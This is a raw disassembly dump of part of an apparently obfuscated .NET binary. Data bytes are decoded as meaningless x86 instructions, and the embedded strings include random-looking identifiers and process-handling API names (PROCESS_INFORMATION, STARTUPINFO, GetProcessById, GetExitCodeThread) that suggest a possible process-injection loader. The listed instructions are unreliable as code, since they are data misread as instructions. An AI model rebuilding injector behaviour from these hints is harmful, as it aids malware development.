10002bcd:	00 f5                	add    %dh,%ch
10002bcf:	01 2e                	add    %ebp,(%esi)
10002bd1:	00 43 00             	add    %al,0x0(%ebx)
10002bd4:	e1 01                	loope  0x10002bd7
10002bd6:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
10002bda:	fb                   	sti
10002bdb:	01 2e                	add    %ebp,(%esi)
10002bdd:	00 53 00             	add    %dl,0x0(%ebx)
10002be0:	f5                   	cmc
10002be1:	01 2e                	add    %ebp,(%esi)
10002be3:	00 5b 00             	add    %bl,0x0(%ebx)
10002be6:	f5                   	cmc
10002be7:	01 2e                	add    %ebp,(%esi)
10002be9:	00 63 00             	add    %ah,0x0(%ebx)
10002bec:	13 02                	adc    (%edx),%eax
10002bee:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
10002bf2:	3d 02 2e 00 73       	cmp    $0x73002e02,%eax
10002bf7:	00 4a 02             	add    %cl,0x2(%edx)
10002bfa:	a3 00 7b 00 94       	mov    %eax,0x94007b00
10002bff:	02 c3                	add    %bl,%al
10002c01:	00 7b 00             	add    %bh,0x0(%ebx)
10002c04:	94                   	xchg   %eax,%esp
10002c05:	02 60 01             	add    0x1(%eax),%ah
10002c08:	7b 00                	jnp    0x10002c0a
10002c0a:	94                   	xchg   %eax,%esp
10002c0b:	02 80 01 7b 00 94    	add    -0x6bff84ff(%eax),%al
10002c11:	02 83 00 b4 00 f4    	add    -0xbff4c00(%ebx),%al
10002c17:	00 14 07             	add    %dl,(%edi,%eax,1)
10002c1a:	42                   	inc    %edx
10002c1b:	00 bb 00 d1 00 40    	add    %bh,0x4000d100(%ebx)
10002c21:	01 03                	add    %eax,(%ebx)
10002c23:	00 0a                	add    %cl,(%edx)
10002c25:	09 01                	or     %eax,(%ecx)
10002c27:	00 40 01             	add    %al,0x1(%eax)
10002c2a:	05 00 bd 09 01       	add    $0x109bd00,%eax
10002c2f:	00 40 01             	add    %al,0x1(%eax)
10002c32:	09 00                	or     %eax,(%eax)
10002c34:	f1                   	int1
10002c35:	03 01                	add    (%ecx),%eax
10002c37:	00 00                	add    %al,(%eax)
10002c39:	01 0d 00 50 04 01    	add    %ecx,0x1045000
10002c3f:	00 40 01             	add    %al,0x1(%eax)
10002c42:	11 00                	adc    %eax,(%eax)
10002c44:	a1 09 01 00 40       	mov    0x40000109,%eax
10002c49:	01 13                	add    %edx,(%ebx)
10002c4b:	00 03                	add    %al,(%ebx)
10002c4d:	04 01                	add    $0x1,%al
10002c4f:	00 04 80             	add    %al,(%eax,%eax,4)
10002c52:	00 00                	add    %al,(%eax)
10002c54:	01 00                	add    %eax,(%eax)
	...
10002c62:	11 06                	adc    %eax,(%esi)
10002c64:	00 00                	add    %al,(%eax)
10002c66:	04 00                	add    $0x0,%al
	...
10002c70:	00 00                	add    %al,(%eax)
10002c72:	28 01                	sub    %al,(%ecx)
10002c74:	84 03                	test   %al,(%ebx)
10002c76:	00 00                	add    %al,(%eax)
10002c78:	00 00                	add    %al,(%eax)
10002c7a:	04 00                	add    $0x0,%al
	...
10002c84:	00 00                	add    %al,(%eax)
10002c86:	28 01                	sub    %al,(%ecx)
10002c88:	53                   	push   %ebx
10002c89:	07                   	pop    %es
10002c8a:	00 00                	add    %al,(%eax)
10002c8c:	00 00                	add    %al,(%eax)
10002c8e:	04 00                	add    $0x0,%al
	...
10002c98:	00 00                	add    %al,(%eax)
10002c9a:	28 01                	sub    %al,(%ecx)
10002c9c:	7e 04                	jle    0x10002ca2
10002c9e:	00 00                	add    %al,(%eax)
10002ca0:	00 00                	add    %al,(%eax)
10002ca2:	03 00                	add    (%eax),%eax
10002ca4:	02 00                	add    (%eax),%al
10002ca6:	04 00                	add    $0x0,%al
10002ca8:	02 00                	add    (%eax),%al
10002caa:	05 00 02 00 06       	add    $0x6000200,%eax
10002caf:	00 02                	add    %al,(%edx)
10002cb1:	00 29                	add    %ch,(%ecx)
10002cb3:	00 3e                	add    %bh,(%esi)
10002cb5:	00 2d 00 67 00 2f    	add    %ch,0x2f006700
10002cbb:	00 79 00             	add    %bh,0x0(%ecx)
10002cbe:	33 00                	xor    (%eax),%eax
10002cc0:	97                   	xchg   %eax,%edi
10002cc1:	00 4d 00             	add    %cl,0x0(%ebp)
10002cc4:	3e 00 2f             	add    %ch,%ds:(%edi)
10002cc7:	00 3e                	add    %bh,(%esi)
10002cc9:	00 00                	add    %al,(%eax)
10002ccb:	00 00                	add    %al,(%eax)
10002ccd:	3c 3e                	cmp    $0x3e,%al
10002ccf:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
10002cd2:	32 5f 30             	xor    0x30(%edi),%bl
10002cd5:	00 3c 49             	add    %bh,(%ecx,%ecx,2)
10002cd8:	4e                   	dec    %esi
10002cd9:	51                   	push   %ecx
10002cda:	6e                   	outsb  %ds:(%esi),(%dx)
10002cdb:	74 73                	je     0x10002d50
10002cdd:	57                   	push   %edi
10002cde:	4b                   	dec    %ebx
10002cdf:	32 4a 6d             	xor    0x6d(%edx),%cl
10002ce2:	77 59                	ja     0x10002d3d
10002ce4:	73 4c                	jae    0x10002d32
10002ce6:	72 45                	jb     0x10002d2d
10002ce8:	49                   	dec    %ecx
10002ce9:	6d                   	insl   (%dx),%es:(%edi)
10002cea:	65 69 3e 62 5f 5f 32 	imul   $0x325f5f62,%gs:(%esi),%edi
10002cf1:	5f                   	pop    %edi
10002cf2:	30 00                	xor    %al,(%eax)
10002cf4:	3c 3e                	cmp    $0x3e,%al
10002cf6:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002cf9:	44                   	inc    %esp
10002cfa:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002d01:	6c                   	insb   (%dx),%es:(%edi)
10002d02:	61                   	popa
10002d03:	73 73                	jae    0x10002d78
10002d05:	37                   	aaa
10002d06:	5f                   	pop    %edi
10002d07:	30 00                	xor    %al,(%eax)
10002d09:	3c 50                	cmp    $0x50,%al
10002d0b:	65 71 7a             	gs jno 0x10002d88
10002d0e:	50                   	push   %eax
10002d0f:	79 62                	jns    0x10002d73
10002d11:	4f                   	dec    %edi
10002d12:	67 61                	addr16 popa
10002d14:	6f                   	outsl  %ds:(%esi),(%dx)
10002d15:	73 4a                	jae    0x10002d61
10002d17:	4b                   	dec    %ebx
10002d18:	70 6f                	jo     0x10002d89
10002d1a:	70 5a                	jo     0x10002d76
10002d1c:	6d                   	insl   (%dx),%es:(%edi)
10002d1d:	6f                   	outsl  %ds:(%esi),(%dx)
10002d1e:	66 63 6d 72          	arpl   %bp,0x72(%ebp)
10002d22:	4b                   	dec    %ebx
10002d23:	3e 67 5f             	ds addr16 pop %edi
10002d26:	5f                   	pop    %edi
10002d27:	55                   	push   %ebp
10002d28:	63 52 51             	arpl   %edx,0x51(%edx)
10002d2b:	76 69                	jbe    0x10002d96
10002d2d:	49                   	dec    %ecx
10002d2e:	4a                   	dec    %edx
10002d2f:	35 39 66 54 44       	xor    $0x44546639,%eax
10002d34:	51                   	push   %ecx
10002d35:	76 49                	jbe    0x10002d80
10002d37:	47                   	inc    %edi
10002d38:	63 7c 37 5f          	arpl   %edi,0x5f(%edi,%esi,1)
10002d3c:	30 00                	xor    %al,(%eax)
10002d3e:	3c 3e                	cmp    $0x3e,%al
10002d40:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
10002d43:	39 5f 30             	cmp    %ebx,0x30(%edi)
10002d46:	00 3c 43             	add    %bh,(%ebx,%eax,2)
10002d49:	57                   	push   %edi
10002d4a:	51                   	push   %ecx
10002d4b:	63 4f 4a             	arpl   %ecx,0x4a(%edi)
10002d4e:	48                   	dec    %eax
10002d4f:	41                   	inc    %ecx
10002d50:	38 47 51             	cmp    %al,0x51(%edi)
10002d53:	4b                   	dec    %ebx
10002d54:	7a 51                	jp     0x10002da7
10002d56:	6a 58                	push   $0x58
10002d58:	61                   	popa
10002d59:	57                   	push   %edi
10002d5a:	6c                   	insb   (%dx),%es:(%edi)
10002d5b:	67 3e 62 5f 5f       	bound  %ebx,%ds:0x5f(%bx)
10002d60:	39 5f 30             	cmp    %ebx,0x30(%edi)
10002d63:	00 3c 50             	add    %bh,(%eax,%edx,2)
10002d66:	65 71 7a             	gs jno 0x10002de3
10002d69:	50                   	push   %eax
10002d6a:	79 62                	jns    0x10002dce
10002d6c:	4f                   	dec    %edi
10002d6d:	67 61                	addr16 popa
10002d6f:	6f                   	outsl  %ds:(%esi),(%dx)
10002d70:	73 4a                	jae    0x10002dbc
10002d72:	4b                   	dec    %ebx
10002d73:	70 6f                	jo     0x10002de4
10002d75:	70 5a                	jo     0x10002dd1
10002d77:	6d                   	insl   (%dx),%es:(%edi)
10002d78:	6f                   	outsl  %ds:(%esi),(%dx)
10002d79:	66 63 6d 72          	arpl   %bp,0x72(%ebp)
10002d7d:	4b                   	dec    %ebx
10002d7e:	3e 67 5f             	ds addr16 pop %edi
10002d81:	5f                   	pop    %edi
10002d82:	47                   	inc    %edi
10002d83:	56                   	push   %esi
10002d84:	57                   	push   %edi
10002d85:	75 51                	jne    0x10002dd8
10002d87:	6d                   	insl   (%dx),%es:(%edi)
10002d88:	77 50                	ja     0x10002dda
10002d8a:	46                   	inc    %esi
10002d8b:	48                   	dec    %eax
10002d8c:	52                   	push   %edx
10002d8d:	4a                   	dec    %edx
10002d8e:	77 71                	ja     0x10002e01
10002d90:	79 65                	jns    0x10002df7
10002d92:	61                   	popa
10002d93:	6a 51                	push   $0x51
10002d95:	7c 37                	jl     0x10002dce
10002d97:	5f                   	pop    %edi
10002d98:	31 00                	xor    %eax,(%eax)
10002d9a:	49                   	dec    %ecx
10002d9b:	45                   	inc    %ebp
10002d9c:	6e                   	outsb  %ds:(%esi),(%dx)
10002d9d:	75 6d                	jne    0x10002e0c
10002d9f:	65 72 61             	gs jb  0x10002e03
10002da2:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002da6:	31 00                	xor    %eax,(%eax)
10002da8:	4c                   	dec    %esp
10002da9:	69 73 74 60 31 00 53 	imul   $0x53003160,0x74(%ebx),%esi
10002db0:	59                   	pop    %ecx
10002db1:	6b 73 62 78          	imul   $0x78,0x62(%ebx),%esi
10002db5:	72 73                	jb     0x10002e2a
10002db7:	44                   	inc    %esp
10002db8:	48                   	dec    %eax
10002db9:	36 48                	ss dec %eax
10002dbb:	46                   	inc    %esi
10002dbc:	59                   	pop    %ecx
10002dbd:	38 58 58             	cmp    %bl,0x58(%eax)
10002dc0:	62 58 57             	bound  %ebx,0x57(%eax)
10002dc3:	43                   	inc    %ebx
10002dc4:	4b                   	dec    %ebx
10002dc5:	42                   	inc    %edx
10002dc6:	32 00                	xor    (%eax),%al
10002dc8:	50                   	push   %eax
10002dc9:	4b                   	dec    %ebx
10002dca:	6b 45 6e 79          	imul   $0x79,0x6e(%ebp),%eax
10002dce:	4b                   	dec    %ebx
10002dcf:	4e                   	dec    %esi
10002dd0:	54                   	push   %esp
10002dd1:	72 59                	jb     0x10002e2c
10002dd3:	46                   	inc    %esi
10002dd4:	49                   	dec    %ecx
10002dd5:	32 00                	xor    (%eax),%al
10002dd7:	3c 50                	cmp    $0x50,%al
10002dd9:	65 71 7a             	gs jno 0x10002e56
10002ddc:	50                   	push   %eax
10002ddd:	79 62                	jns    0x10002e41
10002ddf:	4f                   	dec    %edi
10002de0:	67 61                	addr16 popa
10002de2:	6f                   	outsl  %ds:(%esi),(%dx)
10002de3:	73 4a                	jae    0x10002e2f
10002de5:	4b                   	dec    %ebx
10002de6:	70 6f                	jo     0x10002e57
10002de8:	70 5a                	jo     0x10002e44
10002dea:	6d                   	insl   (%dx),%es:(%edi)
10002deb:	6f                   	outsl  %ds:(%esi),(%dx)
10002dec:	66 63 6d 72          	arpl   %bp,0x72(%ebp)
10002df0:	4b                   	dec    %ebx
10002df1:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
10002df5:	32 00                	xor    (%eax),%al
10002df7:	46                   	inc    %esi
10002df8:	75 6e                	jne    0x10002e68
10002dfa:	63 60 32             	arpl   %esp,0x32(%eax)
10002dfd:	00 41 67             	add    %al,0x67(%ecx)
10002e00:	52                   	push   %edx
10002e01:	55                   	push   %ebp
10002e02:	71 61                	jno    0x10002e65
10002e04:	32 47 4b             	xor    0x4b(%edi),%al
10002e07:	53                   	push   %ebx
10002e08:	36 45                	ss inc %ebp
10002e0a:	4e                   	dec    %esi
10002e0b:	4c                   	dec    %esp
10002e0c:	33 00                	xor    (%eax),%eax
10002e0e:	54                   	push   %esp
10002e0f:	43                   	inc    %ebx
10002e10:	49                   	dec    %ecx
10002e11:	69 6f 54 59 75 35 56 	imul   $0x56357559,0x54(%edi),%ebp
10002e18:	33 79 7a             	xor    0x7a(%ecx),%edi
10002e1b:	68 57 4a 6b 55       	push   $0x556b4a57
10002e20:	5a                   	pop    %edx
10002e21:	66 56                	push   %si
10002e23:	48                   	dec    %eax
10002e24:	34 38                	xor    $0x38,%al
10002e26:	00 67 65             	add    %ah,0x65(%edi)
10002e29:	74 5f                	je     0x10002e8a
10002e2b:	55                   	push   %ebp
10002e2c:	54                   	push   %esp
10002e2d:	46                   	inc    %esi
10002e2e:	38 00                	cmp    %al,(%eax)
10002e30:	58                   	pop    %eax
10002e31:	56                   	push   %esi
10002e32:	72 49                	jb     0x10002e7d
10002e34:	6b 70 6c 58          	imul   $0x58,0x6c(%eax),%esi
10002e38:	38 52 4a             	cmp    %dl,0x4a(%edx)
10002e3b:	63 65 32             	arpl   %esp,0x32(%ebp)
10002e3e:	39 00                	cmp    %eax,(%eax)
10002e40:	3c 3e                	cmp    $0x3e,%al
10002e42:	39 00                	cmp    %eax,(%eax)
10002e44:	3c 4d                	cmp    $0x4d,%al
10002e46:	6f                   	outsl  %ds:(%esi),(%dx)
10002e47:	64 75 6c             	fs jne 0x10002eb6
10002e4a:	65 3e 00 51 6a       	gs add %dl,%ds:0x6a(%ecx)
10002e4f:	4c                   	dec    %esp
10002e50:	47                   	inc    %edi
10002e51:	55                   	push   %ebp
10002e52:	59                   	pop    %ecx
10002e53:	34 48                	xor    $0x48,%al
10002e55:	50                   	push   %eax
10002e56:	61                   	popa
10002e57:	55                   	push   %ebp
10002e58:	68 75 57 67 52       	push   $0x52675775
10002e5d:	58                   	pop    %eax
10002e5e:	33 69 79             	xor    0x79(%ecx),%ebp
10002e61:	72 41                	jb     0x10002ea4
10002e63:	00 54 6c 66          	add    %dl,0x66(%esp,%ebp,2)
10002e67:	67 47                	addr16 inc %edi
10002e69:	58                   	pop    %eax
10002e6a:	5a                   	pop    %edx
10002e6b:	53                   	push   %ebx
10002e6c:	68 41 38 39 4e       	push   $0x4e393841
10002e71:	4c                   	dec    %esp
10002e72:	48                   	dec    %eax
10002e73:	34 78                	xor    $0x78,%al
10002e75:	41                   	inc    %ecx
10002e76:	00 45 7a             	add    %al,0x7a(%ebp)
10002e79:	7a 64                	jp     0x10002edf
10002e7b:	4d                   	dec    %ebp
10002e7c:	48                   	dec    %eax
10002e7d:	68 43 78 37 69       	push   $0x69377843
10002e82:	5a                   	pop    %edx
10002e83:	4e                   	dec    %esi
10002e84:	68 36 43 00 4c       	push   $0x4c004336
10002e89:	50                   	push   %eax
10002e8a:	44                   	inc    %esp
10002e8b:	7a 68                	jp     0x10002ef5
10002e8d:	56                   	push   %esi
10002e8e:	6b 79 68 7a          	imul   $0x7a,0x68(%ecx),%edi
10002e92:	54                   	push   %esp
10002e93:	66 49                	dec    %cx
10002e95:	52                   	push   %edx
10002e96:	4e                   	dec    %esi
10002e97:	52                   	push   %edx
10002e98:	51                   	push   %ecx
10002e99:	73 49                	jae    0x10002ee4
10002e9b:	35 4b 30 45 00       	xor    $0x45304b,%eax
10002ea0:	57                   	push   %edi
10002ea1:	6f                   	outsl  %ds:(%esi),(%dx)
10002ea2:	6d                   	insl   (%dx),%es:(%edi)
10002ea3:	58                   	pop    %eax
10002ea4:	4b                   	dec    %ebx
10002ea5:	6c                   	insb   (%dx),%es:(%edi)
10002ea6:	4f                   	dec    %edi
10002ea7:	50                   	push   %eax
10002ea8:	47                   	inc    %edi
10002ea9:	35 59 70 70 49       	xor    $0x49707059,%eax
10002eae:	45                   	inc    %ebp
10002eaf:	33 4d 36             	xor    0x36(%ebp),%ecx
10002eb2:	68 67 75 37 78       	push   $0x78377567
10002eb7:	33 45 00             	xor    0x0(%ebp),%eax
10002eba:	45                   	inc    %ebp
10002ebb:	65 4f                	gs dec %edi
10002ebd:	7a 76                	jp     0x10002f35
10002ebf:	79 4a                	jns    0x10002f0b
10002ec1:	4d                   	dec    %ebp
10002ec2:	62 36                	bound  %esi,(%esi)
10002ec4:	6d                   	insl   (%dx),%es:(%edi)
10002ec5:	44                   	inc    %esp
10002ec6:	6b 39 45             	imul   $0x45,(%ecx),%edi
10002ec9:	76 45                	jbe    0x10002f10
10002ecb:	00 55 56             	add    %dl,0x56(%ebp)
10002ece:	57                   	push   %edi
10002ecf:	79 75                	jns    0x10002f46
10002ed1:	74 78                	je     0x10002f4b
10002ed3:	72 6b                	jb     0x10002f40
10002ed5:	55                   	push   %ebp
10002ed6:	66 39 52 73          	cmp    %dx,0x73(%edx)
10002eda:	61                   	popa
10002edb:	57                   	push   %edi
10002edc:	30 78 32             	xor    %bh,0x32(%eax)
10002edf:	30 46 00             	xor    %al,0x0(%esi)
10002ee2:	59                   	pop    %ecx
10002ee3:	4f                   	dec    %edi
10002ee4:	67 78 74             	addr16 js 0x10002f5b
10002ee7:	57                   	push   %edi
10002ee8:	6a 78                	push   $0x78
10002eea:	77 7a                	ja     0x10002f66
10002eec:	6a 54                	push   $0x54
10002eee:	53                   	push   %ebx
10002eef:	43                   	inc    %ebx
10002ef0:	76 70                	jbe    0x10002f62
10002ef2:	43                   	inc    %ebx
10002ef3:	43                   	inc    %ebx
10002ef4:	6b 4a 71 46          	imul   $0x46,0x71(%edx),%ecx
10002ef8:	00 57 65             	add    %dl,0x65(%edi)
10002efb:	41                   	inc    %ecx
10002efc:	68 6a 64 6b 46       	push   $0x466b646a
10002f01:	71 72                	jno    0x10002f75
10002f03:	79 6b                	jns    0x10002f70
10002f05:	33 51 6b             	xor    0x6b(%ecx),%edx
10002f08:	72 6f                	jb     0x10002f79
10002f0a:	53                   	push   %ebx
10002f0b:	4a                   	dec    %edx
10002f0c:	77 47                	ja     0x10002f55
10002f0e:	00 45 6d             	add    %al,0x6d(%ebp)
10002f11:	70 63                	jo     0x10002f76
10002f13:	4e                   	dec    %esi
10002f14:	55                   	push   %ebp
10002f15:	39 71 79             	cmp    %esi,0x79(%ecx)
10002f18:	63 54 76 65          	arpl   %edx,0x65(%esi,%esi,2)
10002f1c:	52                   	push   %edx
10002f1d:	77 35                	ja     0x10002f54
10002f1f:	34 51                	xor    $0x51,%al
10002f21:	50                   	push   %eax
10002f22:	48                   	dec    %eax
10002f23:	00 43 7a             	add    %al,0x7a(%ebx)
10002f26:	75 4d                	jne    0x10002f75
10002f28:	71 47                	jno    0x10002f71
10002f2a:	37                   	aaa
10002f2b:	72 57                	jb     0x10002f84
10002f2d:	45                   	inc    %ebp
10002f2e:	6b 77 77 70          	imul   $0x70,0x77(%edi),%esi
10002f32:	6c                   	insb   (%dx),%es:(%edi)
10002f33:	76 44                	jbe    0x10002f79
10002f35:	49                   	dec    %ecx
10002f36:	00 52 6d             	add    %dl,0x6d(%edx)
10002f39:	4b                   	dec    %ebx
10002f3a:	6c                   	insb   (%dx),%es:(%edi)
10002f3b:	4b                   	dec    %ebx
10002f3c:	4d                   	dec    %ebp
10002f3d:	4f                   	dec    %edi
10002f3e:	55                   	push   %ebp
10002f3f:	75 62                	jne    0x10002fa3
10002f41:	71 42                	jno    0x10002f85
10002f43:	58                   	pop    %eax
10002f44:	71 52                	jno    0x10002f98
10002f46:	6d                   	insl   (%dx),%es:(%edi)
10002f47:	4d                   	dec    %ebp
10002f48:	41                   	inc    %ecx
10002f49:	76 44                	jbe    0x10002f8f
10002f4b:	4b                   	dec    %ebx
10002f4c:	00 50 65             	add    %dl,0x65(%eax)
10002f4f:	71 7a                	jno    0x10002fcb
10002f51:	50                   	push   %eax
10002f52:	79 62                	jns    0x10002fb6
10002f54:	4f                   	dec    %edi
10002f55:	67 61                	addr16 popa
10002f57:	6f                   	outsl  %ds:(%esi),(%dx)
10002f58:	73 4a                	jae    0x10002fa4
10002f5a:	4b                   	dec    %ebx
10002f5b:	70 6f                	jo     0x10002fcc
10002f5d:	70 5a                	jo     0x10002fb9
10002f5f:	6d                   	insl   (%dx),%es:(%edi)
10002f60:	6f                   	outsl  %ds:(%esi),(%dx)
10002f61:	66 63 6d 72          	arpl   %bp,0x72(%ebp)
10002f65:	4b                   	dec    %ebx
10002f66:	00 43 50             	add    %al,0x50(%ebx)
10002f69:	6a 77                	push   $0x77
10002f6b:	6f                   	outsl  %ds:(%esi),(%dx)
10002f6c:	4c                   	dec    %esp
10002f6d:	78 64                	js     0x10002fd3
10002f6f:	32 51 61             	xor    0x61(%ecx),%dl
10002f72:	37                   	aaa
10002f73:	56                   	push   %esi
10002f74:	43                   	inc    %ebx
10002f75:	6c                   	insb   (%dx),%es:(%edi)
10002f76:	57                   	push   %edi
10002f77:	6c                   	insb   (%dx),%es:(%edi)
10002f78:	65 4a                	gs dec %edx
10002f7a:	56                   	push   %esi
10002f7b:	38 4c 00 46          	cmp    %cl,0x46(%eax,%eax,1)
10002f7f:	76 6d                	jbe    0x10002fee
10002f81:	6a 62                	push   $0x62
10002f83:	70 57                	jo     0x10002fdc
10002f85:	4c                   	dec    %esp
10002f86:	49                   	dec    %ecx
10002f87:	78 66                	js     0x10002fef
10002f89:	48                   	dec    %eax
10002f8a:	77 65                	ja     0x10002ff1
10002f8c:	52                   	push   %edx
10002f8d:	62 4d 00             	bound  %ecx,0x0(%ebp)
10002f90:	50                   	push   %eax
10002f91:	52                   	push   %edx
10002f92:	4f                   	dec    %edi
10002f93:	43                   	inc    %ebx
10002f94:	45                   	inc    %ebp
10002f95:	53                   	push   %ebx
10002f96:	53                   	push   %ebx
10002f97:	5f                   	pop    %edi
10002f98:	49                   	dec    %ecx
10002f99:	4e                   	dec    %esi
10002f9a:	46                   	inc    %esi
10002f9b:	4f                   	dec    %edi
10002f9c:	52                   	push   %edx
10002f9d:	4d                   	dec    %ebp
10002f9e:	41                   	inc    %ecx
10002f9f:	54                   	push   %esp
10002fa0:	49                   	dec    %ecx
10002fa1:	4f                   	dec    %edi
10002fa2:	4e                   	dec    %esi
10002fa3:	00 53 54             	add    %dl,0x54(%ebx)
10002fa6:	41                   	inc    %ecx
10002fa7:	52                   	push   %edx
10002fa8:	54                   	push   %esp
10002fa9:	55                   	push   %ebp
10002faa:	50                   	push   %eax
10002fab:	49                   	dec    %ecx
10002fac:	4e                   	dec    %esi
10002fad:	46                   	inc    %esi
10002fae:	4f                   	dec    %edi
10002faf:	00 53 79             	add    %dl,0x79(%ebx)
10002fb2:	73 74                	jae    0x10003028
10002fb4:	65 6d                	gs insl (%dx),%es:(%edi)
10002fb6:	2e 49                	cs dec %ecx
10002fb8:	4f                   	dec    %edi
10002fb9:	00 4c 46 64          	add    %cl,0x64(%esi,%eax,2)
10002fbd:	56                   	push   %esi
10002fbe:	73 78                	jae    0x10003038
10002fc0:	53                   	push   %ebx
10002fc1:	66 37                	data16 aaa
10002fc3:	6a 79                	push   $0x79
10002fc5:	7a 79                	jp     0x10003040
10002fc7:	70 66                	jo     0x1000302f
10002fc9:	51                   	push   %ecx
10002fca:	00 5a 66             	add    %bl,0x66(%edx)
10002fcd:	43                   	inc    %ebx
10002fce:	77 53                	ja     0x10003023
10002fd0:	70 79                	jo     0x1000304b
10002fd2:	63 38                	arpl   %edi,(%eax)
10002fd4:	53                   	push   %ebx
10002fd5:	71 62                	jno    0x10003039
10002fd7:	37                   	aaa
10002fd8:	70 59                	jo     0x10003033
10002fda:	46                   	inc    %esi
10002fdb:	43                   	inc    %ebx
10002fdc:	6d                   	insl   (%dx),%es:(%edi)
10002fdd:	51                   	push   %ecx
10002fde:	00 45 51             	add    %al,0x51(%ebp)
10002fe1:	4a                   	dec    %edx
10002fe2:	71 72                	jno    0x10003056
10002fe4:	4f                   	dec    %edi
10002fe5:	6c                   	insb   (%dx),%es:(%edi)
10002fe6:	43                   	inc    %ebx
10002fe7:	68 4a 66 54 46       	push   $0x4654664a
10002fec:	45                   	inc    %ebp
10002fed:	4a                   	dec    %edx
10002fee:	53                   	push   %ebx
10002fef:	00 4c 48 71          	add    %cl,0x71(%eax,%ecx,2)
10002ff3:	51                   	push   %ecx
10002ff4:	50                   	push   %eax
10002ff5:	47                   	inc    %edi
10002ff6:	6c                   	insb   (%dx),%es:(%edi)
10002ff7:	41                   	inc    %ecx
10002ff8:	33 6f 68             	xor    0x68(%edi),%ebp
10002ffb:	43                   	inc    %ebx
10002ffc:	43                   	inc    %ebx
10002ffd:	41                   	inc    %ecx
10002ffe:	6d                   	insl   (%dx),%es:(%edi)
10002fff:	37                   	aaa
10003000:	4f                   	dec    %edi
10003001:	57                   	push   %edi
10003002:	00 59 5a             	add    %bl,0x5a(%ecx)
10003005:	57                   	push   %edi
10003006:	76 6a                	jbe    0x10003072
10003008:	64 34 31             	fs xor $0x31,%al
1000300b:	74 71                	je     0x1000307e
1000300d:	66 41                	inc    %cx
1000300f:	48                   	dec    %eax
10003010:	69 32 71 4d 30 77    	imul   $0x77304d71,(%edx),%esi
10003016:	6b 53 72 75          	imul   $0x75,0x72(%ebx),%edx
1000301a:	6e                   	outsb  %ds:(%esi),(%dx)
1000301b:	57                   	push   %edi
1000301c:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
10003020:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
10003024:	00 56 6a             	add    %dl,0x6a(%esi)
10003027:	54                   	push   %esp
10003028:	53                   	push   %ebx
10003029:	4c                   	dec    %esp
1000302a:	4d                   	dec    %ebp
1000302b:	32 49 5a             	xor    0x5a(%ecx),%cl
1000302e:	77 39                	ja     0x10003069
10003030:	47                   	inc    %edi
10003031:	75 68                	jne    0x1000309b
10003033:	6b 6a 38 4a          	imul   $0x4a,0x38(%edx),%ebp
10003037:	32 61 00             	xor    0x0(%ecx),%ah
1000303a:	41                   	inc    %ecx
1000303b:	4c                   	dec    %esp
1000303c:	4d                   	dec    %ebp
1000303d:	4c                   	dec    %esp
1000303e:	41                   	inc    %ecx
1000303f:	6e                   	outsb  %ds:(%esi),(%dx)
10003040:	47                   	inc    %edi
10003041:	73 4f                	jae    0x10003092
10003043:	46                   	inc    %esi
10003044:	74 4f                	je     0x10003095
10003046:	73 59                	jae    0x100030a1
10003048:	4d                   	dec    %ebp
10003049:	65 74 61             	gs je  0x100030ad
1000304c:	00 63 62             	add    %ah,0x62(%ebx)
1000304f:	00 6d 73             	add    %ch,0x73(%ebp)
10003052:	63 6f 72             	arpl   %ebp,0x72(%edi)
10003055:	6c                   	insb   (%dx),%es:(%edi)
10003056:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
1000305d:	54                   	push   %esp
1000305e:	49                   	dec    %ecx
1000305f:	68 62 64 77 65       	push   $0x65776462
10003064:	45                   	inc    %ebp
10003065:	56                   	push   %esi
10003066:	75 33                	jne    0x1000309b
10003068:	31 53 79             	xor    %edx,0x79(%ebx)
1000306b:	41                   	inc    %ecx
1000306c:	4b                   	dec    %ebx
1000306d:	30 69 63             	xor    %ch,0x63(%ecx)
10003070:	00 53 79             	add    %dl,0x79(%ebx)
10003073:	73 74                	jae    0x100030e9
10003075:	65 6d                	gs insl (%dx),%es:(%edi)
10003077:	2e 43                	cs inc %ebx
10003079:	6f                   	outsl  %ds:(%esi),(%dx)
1000307a:	6c                   	insb   (%dx),%es:(%edi)
1000307b:	6c                   	insb   (%dx),%es:(%edi)
1000307c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10003081:	6e                   	outsb  %ds:(%esi),(%dx)
10003082:	73 2e                	jae    0x100030b2
10003084:	47                   	inc    %edi
10003085:	65 6e                	outsb  %gs:(%esi),(%dx)
10003087:	65 72 69             	gs jb  0x100030f3
1000308a:	63 00                	arpl   %eax,(%eax)
1000308c:	47                   	inc    %edi
1000308d:	65 74 50             	gs je  0x100030e0
10003090:	72 6f                	jb     0x10003101
10003092:	63 65 73             	arpl   %esp,0x73(%ebp)
10003095:	73 42                	jae    0x100030d9
10003097:	79 49                	jns    0x100030e2
10003099:	64 00 58 6e          	add    %bl,%fs:0x6e(%eax)
1000309d:	6d                   	insl   (%dx),%es:(%edi)
1000309e:	70 69                	jo     0x10003109
100030a0:	6b 68 61 46          	imul   $0x46,0x61(%eax),%ebp
100030a4:	4a                   	dec    %edx
100030a5:	71 7a                	jno    0x10003121
100030a7:	64 4b                	fs dec %ebx
100030a9:	67 69 4e 64 00 52 44 	imul   $0x61445200,0x64(%bp),%ecx
100030b0:	61 
100030b1:	4f                   	dec    %edi
100030b2:	43                   	inc    %ebx
100030b3:	5a                   	pop    %edx
100030b4:	66 50                	push   %ax
100030b6:	72 50                	jb     0x10003108
100030b8:	43                   	inc    %ebx
100030b9:	65 52                	gs push %edx
100030bb:	64 00 47 65          	add    %al,%fs:0x65(%edi)
100030bf:	74 45                	je     0x10003106
100030c1:	78 69                	js     0x1000312c
100030c3:	74 43                	je     0x10003108
100030c5:	6f                   	outsl  %ds:(%esi),(%dx)
100030c6:	64 65 54             	fs gs push %esp
100030c9:	68 72 65 61 64       	push   $0x64616572
100030ce:	00 43 72             	add    %al,0x72(%ebx)
100030d1:	65 61                	gs popa
100030d3:	74 65                	je     0x1000313a
100030d5:	52                   	push   %edx
